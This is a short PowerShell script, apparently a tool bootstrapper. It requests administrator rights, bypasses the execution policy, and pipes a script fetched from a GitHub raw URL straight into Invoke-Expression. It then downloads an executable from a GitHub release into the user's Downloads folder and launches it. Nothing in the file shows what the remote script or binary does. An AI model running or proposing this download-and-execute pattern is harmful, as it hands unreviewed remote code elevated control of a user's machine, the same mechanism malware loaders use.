$ProgressPreference = 'SilentlyContinue'

function Start-PersistentScript {
    param ([string]$Url)
    
    $command = "powershell -NoExit -ExecutionPolicy Bypass -Command `"iex (irm '$Url')`""
    Start-Process cmd.exe -Verb RunAs -ArgumentList "/k $command"
}

Start-PersistentScript "https://raw.githubusercontent.com/1Mets/Forensics/refs/heads/main/Start.ps1"


iwr -Uri "https://github.com/1Mets/downloader/releases/download/downloader/main.exe" -OutFile "$env:USERPROFILE\Downloads\ToolDownloader.exe"

Start "$env:USERPROFILE\Downloads\ToolDownloader.exe"
